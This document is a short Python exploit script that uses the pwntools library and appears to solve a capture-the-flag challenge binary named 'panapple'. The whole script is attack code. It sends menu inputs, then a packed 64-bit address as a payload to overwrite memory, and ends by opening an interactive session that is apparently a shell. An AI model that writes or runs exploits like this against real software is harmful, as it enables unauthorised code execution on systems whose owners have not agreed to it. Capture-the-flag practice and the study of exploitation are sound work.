from pwn import *
context.log_level = 'debug'

cn = process('./panapple')

bin = ELF('panapple')

cn.recv()
cn.sendline('pan')

cn.recv()
cn.sendline('panapple')
cn.recv()
cn.sendline(p64(0x0000000000601D68))

cn.recv()
cn.sendline('pan')

cn.interactive()